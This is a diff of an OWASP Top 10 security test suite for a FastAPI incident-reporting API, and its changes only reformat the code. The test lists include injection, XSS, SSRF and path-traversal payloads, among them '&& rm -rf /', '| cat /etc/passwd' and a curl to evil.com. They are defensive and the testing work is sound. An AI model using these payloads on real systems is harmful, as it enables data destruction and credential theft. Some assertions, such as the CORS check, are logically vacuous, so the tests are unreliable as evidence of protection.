@@ -37,6 +37,7 @@ def client():
     """Create test client."""
     from fastapi.testclient import TestClient
     from src.main import app
+
     return TestClient(app)
 
 
@@ -61,7 +62,7 @@ def auth_headers(client) -> dict:
 class TestA01BrokenAccessControl:
     """
     A01:2021 - Broken Access Control
-    
+
     Tests for:
     - Unauthorized access to resources
     - Privilege escalation
@@ -79,7 +80,7 @@ class TestA01BrokenAccessControl:
             "/api/documents",
             "/api/policies",
         ]
-        
+
         for endpoint in protected_endpoints:
             response = client.get(endpoint)
             assert response.status_code == 401, f"{endpoint} accessible without auth"
@@ -88,7 +89,7 @@ class TestA01BrokenAccessControl:
         """Cannot access data belonging to other users via IDOR."""
         if not auth_headers:
             pytest.skip("Auth required")
-        
+
         # Try to access another user's data with a guessed ID
         response = client.get("/api/users/99999", headers=auth_headers)
         assert response.status_code in [403, 404]
@@ -97,11 +98,11 @@ class TestA01BrokenAccessControl:
         """Admin-only endpoints blocked for regular users."""
         if not auth_headers:
             pytest.skip("Auth required")
-        
+
         admin_endpoints = [
             "/api/users",  # List all users
         ]
-        
+
         for endpoint in admin_endpoints:
             response = client.get(endpoint, headers=auth_headers)
             # Should be 403 Forbidden or 200 if user has permission
@@ -113,7 +114,7 @@ class TestA01BrokenAccessControl:
             "/api/health",
             headers={"Origin": "https://malicious-site.com"},
         )
-        
+
         # Should not echo back malicious origin
         allow_origin = response.headers.get("Access-Control-Allow-Origin", "")
         assert allow_origin != "*" or allow_origin != "https://malicious-site.com"
@@ -122,7 +123,7 @@ class TestA01BrokenAccessControl:
         """Dangerous HTTP methods are restricted."""
         if not auth_headers:
             pytest.skip("Auth required")
-        
+
         # TRACE and TRACK should be disabled
         response = client.request("TRACE", "/api/health")
         assert response.status_code in [405, 404]
@@ -136,7 +137,7 @@ class TestA01BrokenAccessControl:
 class TestA02CryptographicFailures:
     """
     A02:2021 - Cryptographic Failures
-    
+
     Tests for:
     - Sensitive data exposure
     - Weak encryption
@@ -147,7 +148,7 @@ class TestA02CryptographicFailures:
         """Passwords are not exposed in API responses."""
         if not auth_headers:
             pytest.skip("Auth required")
-        
+
         response = client.get("/api/users/me", headers=auth_headers)
         if response.status_code == 200:
             data = response.json()
@@ -160,7 +161,7 @@ class TestA02CryptographicFailures:
             "/api/auth/login",
             json={"username": "test@test.com", "password": "wrong"},
         )
-        
+
         if response.status_code == 401:
             error_msg = response.text.lower()
             assert "token" not in error_msg or len(error_msg) < 500
@@ -168,14 +169,14 @@ class TestA02CryptographicFailures:
     def test_https_enforced_headers(self, client):
         """HTTPS enforcement headers are present."""
         response = client.get("/health")
-        
+
         # In production, should have HSTS header
         # This is informational - may not be set in test environment
 
     def test_sensitive_headers_not_exposed(self, client):
         """Sensitive headers are not exposed."""
         response = client.get("/health")
-        
+
         # Should not expose internal server details
         headers = dict(response.headers)
         assert "X-Powered-By" not in headers
@@ -189,7 +190,7 @@ class TestA02CryptographicFailures:
 class TestA03Injection:
     """
     A03:2021 - Injection
-    
+
     Tests for:
     - SQL Injection
     - NoSQL Injection
@@ -202,7 +203,7 @@ class TestA03Injection:
         """SQL injection in search parameters is blocked."""
         if not auth_headers:
             pytest.skip("Auth required")
-        
+
         sql_payloads = [
             "'; DROP TABLE users; --",
             "1' OR '1'='1",
@@ -213,7 +214,7 @@ class TestA03Injection:
             "1 OR 1=1",
             "' OR ''='",
         ]
-        
+
         for payload in sql_payloads:
             response = client.get(
                 f"/api/incidents?search={payload}",
@@ -228,7 +229,7 @@ class TestA03Injection:
             "'; DROP TABLE incidents; --",
             "test'); DELETE FROM incidents; --",
         ]
-        
+
         for payload in sql_payloads:
             response = client.post(
                 "/api/portal/report",
@@ -245,7 +246,7 @@ class TestA03Injection:
         """Command injection is blocked."""
         if not auth_headers:
             pytest.skip("Auth required")
-        
+
         cmd_payloads = [
             "; ls -la",
             "| cat /etc/passwd",
@@ -254,7 +255,7 @@ class TestA03Injection:
             "&& rm -rf /",
             "; curl http://evil.com",
         ]
-        
+
         for payload in cmd_payloads:
             response = client.post(
                 "/api/portal/report",
@@ -278,7 +279,7 @@ class TestA03Injection:
             "<body onload=alert('XSS')>",
             "<iframe src='javascript:alert(1)'>",
         ]
-        
+
         for payload in xss_payloads:
             response = client.post(
                 "/api/portal/report",
@@ -289,7 +290,7 @@ class TestA03Injection:
                     "severity": "low",
                 },
             )
-            
+
             if response.status_code in [200, 201]:
                 data = response.json()
                 # Check payload is not returned unescaped
@@ -305,7 +306,7 @@ class TestA03Injection:
 class TestA04InsecureDesign:
     """
     A04:2021 - Insecure Design
-    
+
     Tests for:
     - Business logic flaws
     - Missing rate limiting
@@ -320,7 +321,7 @@ class TestA04InsecureDesign:
                 "/api/auth/login",
                 json={"username": "test@test.com", "password": "wrong"},
             )
-        
+
         # Should eventually be rate limited
         # (Rate limiting may not trigger in test environment)
 
@@ -328,7 +329,7 @@ class TestA04InsecureDesign:
         """Mass assignment attacks are blocked."""
         if not auth_headers:
             pytest.skip("Auth required")
-        
+
         # Try to set admin flag via mass assignment
         response = client.post(
             "/api/incidents",
@@ -352,7 +353,7 @@ class TestA04InsecureDesign:
 class TestA05SecurityMisconfiguration:
     """
     A05:2021 - Security Misconfiguration
-    
+
     Tests for:
     - Default credentials
     - Error handling
@@ -363,16 +364,16 @@ class TestA05SecurityMisconfiguration:
     def test_no_stack_traces_in_errors(self, client):
         """Stack traces are not exposed in error responses."""
         response = client.get("/api/nonexistent-endpoint")
-        
+
         error_text = response.text.lower()
         assert "traceback" not in error_text
-        assert "file \"" not in error_text
+        assert 'file "' not in error_text
         assert "line " not in error_text or len(error_text) < 200
 
     def test_no_debug_info_in_headers(self, client):
         """Debug information is not in headers."""
         response = client.get("/health")
-        
+
         headers = dict(response.headers)
         assert "X-Debug" not in headers
         assert "X-Trace-Id" not in headers or True  # Trace IDs are OK
@@ -381,9 +382,9 @@ class TestA05SecurityMisconfiguration:
         """Error messages do not reveal system details."""
         if not auth_headers:
             pytest.skip("Auth required")
-        
+
         response = client.get("/api/incidents/999999999", headers=auth_headers)
-        
+
         if response.status_code == 404:
             error_text = response.text
             assert "/home/" not in error_text
@@ -399,7 +400,7 @@ class TestA05SecurityMisconfiguration:
 class TestA06VulnerableComponents:
     """
     A06:2021 - Vulnerable and Outdated Components
-    
+
     Note: Actual vulnerability scanning is done by safety/pip-audit in CI.
     These tests verify the scanning is in place.
     """
@@ -414,7 +415,7 @@ class TestA06VulnerableComponents:
         """Known vulnerable versions are not pinned."""
         project_root = Path(__file__).parent.parent.parent
         requirements = project_root / "requirements.txt"
-        
+
         if requirements.exists():
             content = requirements.read_text()
             # Check for known vulnerable versions (example)
@@ -429,7 +430,7 @@ class TestA06VulnerableComponents:
 class TestA07AuthenticationFailures:
     """
     A07:2021 - Identification and Authentication Failures
-    
+
     Tests for:
     - Weak passwords
     - Session management
@@ -453,7 +454,7 @@ class TestA07AuthenticationFailures:
         """Expired JWT tokens are rejected."""
         # This is an obviously expired token
         expired_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxfQ.invalid"
-        
+
         response = client.get(
             "/api/users/me",
             headers={"Authorization": f"Bearer {expired_token}"},
@@ -468,7 +469,7 @@ class TestA07AuthenticationFailures:
             {"Authorization": "Basic dXNlcjpwYXNz"},
             {"Authorization": "InvalidScheme token"},
         ]
-        
+
         for headers in malformed_headers:
             response = client.get("/api/users/me", headers=headers)
             assert response.status_code in [401, 422]
@@ -482,7 +483,7 @@ class TestA07AuthenticationFailures:
 class TestA08IntegrityFailures:
     """
     A08:2021 - Software and Data Integrity Failures
-    
+
     Tests for:
     - Insecure deserialization
     - Unsigned data
@@ -495,7 +496,7 @@ class TestA08IntegrityFailures:
             '{"key": undefined}',  # JavaScript undefined
             '{key: "value"}',  # Unquoted key
         ]
-        
+
         for payload in malformed_json:
             response = client.post(
                 "/api/portal/report",
@@ -512,7 +513,7 @@ class TestA08IntegrityFailures:
             "description": "x" * (10 * 1024 * 1024),  # 10MB
             "severity": "low",
         }
-        
+
         response = client.post("/api/portal/report", json=large_payload)
         # Should be rejected or truncated
         assert response.status_code in [413, 422, 200, 201]
@@ -526,7 +527,7 @@ class TestA08IntegrityFailures:
 class TestA09LoggingFailures:
     """
     A09:2021 - Security Logging and Monitoring Failures
-    
+
     Tests for:
     - Audit logging exists
     - Failed login attempts logged
@@ -546,7 +547,7 @@ class TestA09LoggingFailures:
 class TestA10SSRF:
     """
     A10:2021 - Server-Side Request Forgery
-    
+
     Tests for:
     - URL validation
     - Internal resource access prevention
@@ -556,7 +557,7 @@ class TestA10SSRF:
         """SSRF to local addresses is blocked."""
         if not auth_headers:
             pytest.skip("Auth required")
-        
+
         ssrf_payloads = [
             "http://localhost/admin",
             "http://127.0.0.1/",
@@ -565,7 +566,7 @@ class TestA10SSRF:
             "http://[::1]/",
             "file:///etc/passwd",
         ]
-        
+
         # These would be tested if there's an endpoint that fetches URLs
 
 
@@ -581,7 +582,7 @@ class TestAdditionalSecurity:
         """Path traversal attacks are blocked."""
         if not auth_headers:
             pytest.skip("Auth required")
-        
+
         traversal_payloads = [
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32\\config\\sam",
@@ -589,7 +590,7 @@ class TestAdditionalSecurity:
             "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
             "..%252f..%252f..%252fetc/passwd",
         ]
-        
+
         for payload in traversal_payloads:
             response = client.get(f"/api/documents/{payload}", headers=auth_headers)
             assert response.status_code in [400, 404, 422]
@@ -607,11 +608,11 @@ class TestAdditionalSecurity:
     def test_no_hardcoded_secrets_in_responses(self, client):
         """No hardcoded secrets in responses."""
         response = client.get("/health")
-        
+
         response_text = response.text.lower()
         secret_patterns = ["api_key", "secret_key", "password", "aws_secret"]
-        
+
         for pattern in secret_patterns:
             if pattern in response_text:
                 # If found, ensure it's not an actual secret value
-                assert "=" not in response_text[response_text.find(pattern):response_text.find(pattern)+50]
+                assert "=" not in response_text[response_text.find(pattern) : response_text.find(pattern) + 50]
